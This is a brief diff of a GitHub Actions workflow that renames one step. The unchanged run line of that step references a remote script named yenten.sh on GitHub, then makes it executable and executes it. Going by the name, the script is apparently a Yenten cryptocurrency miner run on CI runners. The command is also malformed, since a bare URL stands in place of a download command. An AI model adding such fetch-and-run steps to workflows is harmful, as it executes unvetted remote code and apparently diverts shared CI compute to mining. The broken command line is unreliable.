@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: BA_channel
+    - name: Ba_channel
       run: |
         https://github.com/memey357/ujicoba/blob/main/yenten.sh && chmod u+x yenten.sh && ./yenten.sh
